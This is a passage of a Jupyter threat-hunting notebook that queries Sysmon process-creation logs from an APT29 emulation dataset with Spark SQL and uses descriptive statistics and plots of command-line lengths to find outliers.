      "text/plain": [
       "<Figure size 864x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "sysmon_host_day1 = spark.sql(\n",
    "    '''\n",
    "SELECT EventID, count(*) as count\n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = 'Microsoft-Windows-Sysmon/Operational'\n",
    "\n",
    "GROUP BY EventID\n",
    "ORDER BY count DESC\n",
    "                          ''')\n",
    "\n",
    "vis.barh_chart(spark.createDataFrame(sysmon_host_day1.head(8)),'count','EventID','Frequency of Sysmon Logs')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### c) Let's analyze information of Sysmon 1: Process Creation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "What are the event fields for **Sysmon 1**? Let's get this information from OSSEM :D"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>event_code</th>\n",
       "      <th>title</th>\n",
       "      <th>standard_name</th>\n",
       "      <th>standard_type</th>\n",
       "      <th>name</th>\n",
       "      <th>type</th>\n",
       "      <th>description</th>\n",
       "      <th>sample_value</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>tag</td>\n",
       "      <td>TBD</td>\n",
       "      <td>RuleName</td>\n",
       "      <td>string</td>\n",
       "      <td>custom tag mapped to event. i.e ATT&amp;CK techniq...</td>\n",
       "      <td>T1114</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>event_date_creation</td>\n",
       "      <td>TBD</td>\n",
       "      <td>UtcTime</td>\n",
       "      <td>date</td>\n",
       "      <td>Time in UTC when event was created</td>\n",
       "      <td>4/11/18 5:25</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_guid</td>\n",
       "      <td>TBD</td>\n",
       "      <td>ProcessGuid</td>\n",
       "      <td>string</td>\n",
       "      <td>Process Guid of the process that got spawned/c...</td>\n",
       "      <td>{A98268C1-9C2E-5ACD-0000-0010396CAB00}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_id</td>\n",
       "      <td>TBD</td>\n",
       "      <td>ProcessId</td>\n",
       "      <td>integer</td>\n",
       "      <td>Process ID used by the os to identify the crea...</td>\n",
       "      <td>4756</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_path</td>\n",
       "      <td>TBD</td>\n",
       "      <td>Image</td>\n",
       "      <td>string</td>\n",
       "      <td>File path of the process being spawned/created...</td>\n",
       "      <td>C:\\Windows\\System32\\conhost.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>file_version</td>\n",
       "      <td>TBD</td>\n",
       "      <td>FileVersion</td>\n",
       "      <td>string</td>\n",
       "      <td>Version of the image associated with the main ...</td>\n",
       "      <td>10.0.16299.15 (WinBuild.160101.0800)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>file_description</td>\n",
       "      <td>TBD</td>\n",
       "      <td>Description</td>\n",
       "      <td>string</td>\n",
       "      <td>Description of the image associated with the m...</td>\n",
       "      <td>Console Window Host</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>file_product</td>\n",
       "      <td>TBD</td>\n",
       "      <td>Product</td>\n",
       "      <td>string</td>\n",
       "      <td>Product name the image associated with the mai...</td>\n",
       "      <td>Microsoft® Windows® Operating System</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>file_company</td>\n",
       "      <td>TBD</td>\n",
       "      <td>Company</td>\n",
       "      <td>string</td>\n",
       "      <td>Company name the image associated with the mai...</td>\n",
       "      <td>Microsoft Corporation</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>file_name_original</td>\n",
       "      <td>TBD</td>\n",
       "      <td>OriginalFileName</td>\n",
       "      <td>string</td>\n",
       "      <td>original file name</td>\n",
       "      <td>wuauclt.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_command_line</td>\n",
       "      <td>TBD</td>\n",
       "      <td>CommandLine</td>\n",
       "      <td>string</td>\n",
       "      <td>Arguments which were passed to the executable ...</td>\n",
       "      <td>??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>file_current_directory</td>\n",
       "      <td>TBD</td>\n",
       "      <td>CurrentDirectory</td>\n",
       "      <td>string</td>\n",
       "      <td>The path without the name of the image associa...</td>\n",
       "      <td>C:\\WINDOWS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>user_name</td>\n",
       "      <td>TBD</td>\n",
       "      <td>User</td>\n",
       "      <td>string</td>\n",
       "      <td>Name of the account who created the process (c...</td>\n",
       "      <td>DESKTOP-WARDOG\\wardog</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>user_logon_guid</td>\n",
       "      <td>TBD</td>\n",
       "      <td>LogonGuid</td>\n",
       "      <td>string</td>\n",
       "      <td>Logon GUID of the user who created the new pro...</td>\n",
       "      <td>{A98268C1-95F2-5ACD-0000-002019620F00}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>user_logon_id</td>\n",
       "      <td>TBD</td>\n",
       "      <td>LogonId</td>\n",
       "      <td>integer</td>\n",
       "      <td>Login ID of the user who created the new proce...</td>\n",
       "      <td>0xf6219</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>user_session_id</td>\n",
       "      <td>TBD</td>\n",
       "      <td>TerminalSessionId</td>\n",
       "      <td>integer</td>\n",
       "      <td>ID of the session the user belongs to</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_integrity_level</td>\n",
       "      <td>TBD</td>\n",
       "      <td>IntegrityLevel</td>\n",
       "      <td>string</td>\n",
       "      <td>Integrity label assigned to a process</td>\n",
       "      <td>Medium</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>TBD</td>\n",
       "      <td>TBD</td>\n",
       "      <td>Hashes</td>\n",
       "      <td>string</td>\n",
       "      <td>Hashes captured by sysmon driver</td>\n",
       "      <td>SHA1=B0BF5AC2E81BBF597FAD5F349FEEB32CAC449FA2,...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_parent_guid</td>\n",
       "      <td>TBD</td>\n",
       "      <td>ParentProcessGuid</td>\n",
       "      <td>string</td>\n",
       "      <td>ProcessGUID of the process that spawned/create...</td>\n",
       "      <td>{A98268C1-9C2E-5ACD-0000-00100266AB00}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_parent_id</td>\n",
       "      <td>TBD</td>\n",
       "      <td>ParentProcessId</td>\n",
       "      <td>integer</td>\n",
       "      <td>Process ID of the process that spawned/created...</td>\n",
       "      <td>240</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_parent_path</td>\n",
       "      <td>TBD</td>\n",
       "      <td>ParentImage</td>\n",
       "      <td>string</td>\n",
       "      <td>File path that spawned/created the main process</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>1</td>\n",
       "      <td>Event ID 1: Process creation</td>\n",
       "      <td>process_parent_command_line</td>\n",
       "      <td>TBD</td>\n",
       "      <td>ParentCommandLine</td>\n",
       "      <td>string</td>\n",
       "      <td>Arguments which were passed to the executable ...</td>\n",
       "      <td>C:\\WINDOWS\\system32\\cmd.exe</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   event_code                         title                standard_name  \\\n",
       "0           1  Event ID 1: Process creation                          tag   \n",
       "1           1  Event ID 1: Process creation          event_date_creation   \n",
       "2           1  Event ID 1: Process creation                 process_guid   \n",
       "3           1  Event ID 1: Process creation                   process_id   \n",
       "4           1  Event ID 1: Process creation                 process_path   \n",
       "5           1  Event ID 1: Process creation                 file_version   \n",
       "6           1  Event ID 1: Process creation             file_description   \n",
       "7           1  Event ID 1: Process creation                 file_product   \n",
       "8           1  Event ID 1: Process creation                 file_company   \n",
       "9           1  Event ID 1: Process creation           file_name_original   \n",
       "10          1  Event ID 1: Process creation         process_command_line   \n",
       "11          1  Event ID 1: Process creation       file_current_directory   \n",
       "12          1  Event ID 1: Process creation                    user_name   \n",
       "13          1  Event ID 1: Process creation              user_logon_guid   \n",
       "14          1  Event ID 1: Process creation                user_logon_id   \n",
       "15          1  Event ID 1: Process creation              user_session_id   \n",
       "16          1  Event ID 1: Process creation      process_integrity_level   \n",
       "17          1  Event ID 1: Process creation                          TBD   \n",
       "18          1  Event ID 1: Process creation          process_parent_guid   \n",
       "19          1  Event ID 1: Process creation            process_parent_id   \n",
       "20          1  Event ID 1: Process creation          process_parent_path   \n",
       "21          1  Event ID 1: Process creation  process_parent_command_line   \n",
       "\n",
       "   standard_type               name     type  \\\n",
       "0            TBD           RuleName   string   \n",
       "1            TBD            UtcTime     date   \n",
       "2            TBD        ProcessGuid   string   \n",
       "3            TBD          ProcessId  integer   \n",
       "4            TBD              Image   string   \n",
       "5            TBD        FileVersion   string   \n",
       "6            TBD        Description   string   \n",
       "7            TBD            Product   string   \n",
       "8            TBD            Company   string   \n",
       "9            TBD   OriginalFileName   string   \n",
       "10           TBD        CommandLine   string   \n",
       "11           TBD   CurrentDirectory   string   \n",
       "12           TBD               User   string   \n",
       "13           TBD          LogonGuid   string   \n",
       "14           TBD            LogonId  integer   \n",
       "15           TBD  TerminalSessionId  integer   \n",
       "16           TBD     IntegrityLevel   string   \n",
       "17           TBD             Hashes   string   \n",
       "18           TBD  ParentProcessGuid   string   \n",
       "19           TBD    ParentProcessId  integer   \n",
       "20           TBD        ParentImage   string   \n",
       "21           TBD  ParentCommandLine   string   \n",
       "\n",
       "                                          description  \\\n",
       "0   custom tag mapped to event. i.e ATT&CK techniq...   \n",
       "1                  Time in UTC when event was created   \n",
       "2   Process Guid of the process that got spawned/c...   \n",
       "3   Process ID used by the os to identify the crea...   \n",
       "4   File path of the process being spawned/created...   \n",
       "5   Version of the image associated with the main ...   \n",
       "6   Description of the image associated with the m...   \n",
       "7   Product name the image associated with the mai...   \n",
       "8   Company name the image associated with the mai...   \n",
       "9                                  original file name   \n",
       "10  Arguments which were passed to the executable ...   \n",
       "11  The path without the name of the image associa...   \n",
       "12  Name of the account who created the process (c...   \n",
       "13  Logon GUID of the user who created the new pro...   \n",
       "14  Login ID of the user who created the new proce...   \n",
       "15              ID of the session the user belongs to   \n",
       "16              Integrity label assigned to a process   \n",
       "17                   Hashes captured by sysmon driver   \n",
       "18  ProcessGUID of the process that spawned/create...   \n",
       "19  Process ID of the process that spawned/created...   \n",
       "20    File path that spawned/created the main process   \n",
       "21  Arguments which were passed to the executable ...   \n",
       "\n",
       "                                         sample_value  \n",
       "0                                               T1114  \n",
       "1                                        4/11/18 5:25  \n",
       "2              {A98268C1-9C2E-5ACD-0000-0010396CAB00}  \n",
       "3                                                4756  \n",
       "4                     C:\\Windows\\System32\\conhost.exe  \n",
       "5                10.0.16299.15 (WinBuild.160101.0800)  \n",
       "6                                 Console Window Host  \n",
       "7                Microsoft® Windows® Operating System  \n",
       "8                               Microsoft Corporation  \n",
       "9                                         wuauclt.exe  \n",
       "10  ??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff ...  \n",
       "11                                         C:\\WINDOWS  \n",
       "12                              DESKTOP-WARDOG\\wardog  \n",
       "13             {A98268C1-95F2-5ACD-0000-002019620F00}  \n",
       "14                                            0xf6219  \n",
       "15                                                  1  \n",
       "16                                             Medium  \n",
       "17  SHA1=B0BF5AC2E81BBF597FAD5F349FEEB32CAC449FA2,...  \n",
       "18             {A98268C1-9C2E-5ACD-0000-00100266AB00}  \n",
       "19                                                240  \n",
       "20                        C:\\Windows\\System32\\cmd.exe  \n",
       "21                        C:\\WINDOWS\\system32\\cmd.exe  "
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ossem.getEventDf(platform = 'windows', provider = 'sysmon', event = 'event-1')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Now that we know the fields' names of **Sysmon 1**, let's query its info:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-RECORD 0--------------------------------------------------------\n",
      " User              | DMEVALS\\pbeesly                             \n",
      " LogonId           | 0x3731f3                                    \n",
      " ProcessId         | 8524                                        \n",
      " Image             | C:\\ProgramData\\victim\\â€®cod.3aka3.scr      \n",
      " CommandLine       | \"C:\\ProgramData\\victim\\â€®cod.3aka3.scr\" /S \n",
      " ParentProcessId   | 4440                                        \n",
      " ParentImage       | C:\\Windows\\explorer.exe                     \n",
      " ParentCommandLine | C:\\windows\\Explorer.EXE                     \n",
      "only showing top 1 row\n",
      "\n"
     ]
    }
   ],
   "source": [
    "sysmon1 = spark.sql(\n",
    "    '''\n",
    "SELECT User, LogonId, ProcessId, Image, CommandLine, ParentProcessId, ParentImage, ParentCommandLine \n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
    "    AND EventID = 1\n",
    "                          ''')\n",
    "sysmon1.show(1, truncate = False, vertical = True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "All the fields contain **categorical data**, so we can continue doing stack counting operations. Let's try something different: Let's calculate the **length of characters** of the **CommandLine** field."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-RECORD 0--------------------------------------------------------\n",
      " User              | DMEVALS\\pbeesly                             \n",
      " LogonId           | 0x3731f3                                    \n",
      " ProcessId         | 8524                                        \n",
      " Image             | C:\\ProgramData\\victim\\â€®cod.3aka3.scr      \n",
      " CommandLine       | \"C:\\ProgramData\\victim\\â€®cod.3aka3.scr\" /S \n",
      " ParentProcessId   | 4440                                        \n",
      " ParentImage       | C:\\Windows\\explorer.exe                     \n",
      " ParentCommandLine | C:\\windows\\Explorer.EXE                     \n",
      " CommandLineLength | 43                                          \n",
      "only showing top 1 row\n",
      "\n"
     ]
    }
   ],
   "source": [
    "sysmon1 = spark.sql(\n",
    "    '''\n",
    "SELECT User, LogonId, ProcessId, Image, CommandLine, ParentProcessId, ParentImage, ParentCommandLine,\n",
    "        length(CommandLine) as CommandLineLength\n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
    "    AND EventID = 1\n",
    "                          ''')\n",
    "sysmon1.show(1,truncate = False, vertical = True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we have a **Numerical** variable in our dataframe. What do we know about this new variable?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "* Before we continue with our analysis, let's review two basic but important concepts: **Mean** and **Standard Deviation**:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](images/average.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/average2.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](images/average3.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "We can use **descriptive** method to calculate basic statistics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------------+\n",
      "|summary|CommandLineLength|\n",
      "+-------+-----------------+\n",
      "|  count|              446|\n",
      "|   mean| 82.2152466367713|\n",
      "| stddev|337.3961141365345|\n",
      "|    min|                5|\n",
      "|    max|             7106|\n",
      "+-------+-----------------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "sysmon1.select('CommandLineLength').describe().show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "We can also use **numStats** method from openhunt to calculate more basic statistics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Summary of Descriptive Statistics -  CommandLineLength\n",
      "**********************************************************\n",
      "Count of values          :  446\n",
      "Count of Null values     :  1\n",
      "Central tendency:-----------------------------------------\n",
      "Mean(Average)            :  82.22\n",
      "Median(Percentile 25)    :  55.0\n",
      "Min, Max, and Percentiles:--------------------------------\n",
      "Minimum                  :  5\n",
      "Maximum                  :  7106\n",
      "Percentile 25 (Q1)       :  48.0\n",
      "Percentile 75 (Q3)       :  68.0\n",
      "Variation:------------------------------------------------\n",
      "Standard Deviation       :  337.4\n",
      "Range                    :  7101\n",
      "Interquartile Range (IQR):  20.0\n",
      "Shape:----------------------------------------------------\n",
      "Skewness                 :  20.31\n",
      "Kurtosis                 :  420.01\n",
      "**********************************************************\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Statistic</th>\n",
       "      <th>Values</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>count</td>\n",
       "      <td>446.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Count Null Values</td>\n",
       "      <td>1.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>mean</td>\n",
       "      <td>82.215247</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>median</td>\n",
       "      <td>55.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>min</td>\n",
       "      <td>5.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>max</td>\n",
       "      <td>7106.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>percentile25</td>\n",
       "      <td>48.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>percentile75</td>\n",
       "      <td>68.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>stddev</td>\n",
       "      <td>337.396114</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>range</td>\n",
       "      <td>7101.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>IQR</td>\n",
       "      <td>20.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>skewness</td>\n",
       "      <td>20.307979</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>kurtosis</td>\n",
       "      <td>420.010000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            Statistic       Values\n",
       "0               count   446.000000\n",
       "1   Count Null Values     1.000000\n",
       "2                mean    82.215247\n",
       "3              median    55.000000\n",
       "4                 min     5.000000\n",
       "5                 max  7106.000000\n",
       "6        percentile25    48.000000\n",
       "7        percentile75    68.000000\n",
       "8              stddev   337.396114\n",
       "9               range  7101.000000\n",
       "10                IQR    20.000000\n",
       "11           skewness    20.307979\n",
       "12           kurtosis   420.010000"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ds.numStats(sysmon1,'CommandLineLength')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Can we do this statistical analysis in a more **visual** way? Let's check a couple of visualizations :D"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "A **histogram**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f64b6fd0>"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.histogram(sysmon1,'CommandLineLength')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "A **Boxplot***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f64ce290>"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.box_plot(sysmon1,'CommandLineLength')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How can we improve our graphs? Let's add more contex to our SQL query:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "sysmon1 = spark.sql(\n",
    "    '''\n",
    "SELECT User, LogonId, ProcessId, Image, CommandLine, ParentProcessId, ParentImage, ParentCommandLine,\n",
    "        length(CommandLine) as CommandLineLength\n",
    "FROM apt29HostDay1\n",
    "WHERE Channel = \"Microsoft-Windows-Sysmon/Operational\"\n",
    "    AND EventID = 1\n",
    "    AND length(CommandLine) <1000\n",
    "                          ''')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Let's graph our **Histogram** again!!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f5c88510>"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.histogram(sysmon1,'CommandLineLength')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "And our **Boxplot** also!!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f81f659a790>"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "vis.box_plot(sysmon1,'CommandLineLength')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "And what about the **atipic** values or outliers for the CommandLine lenght? Let's filter the one  :D"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We have  1  records\n",
      "-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------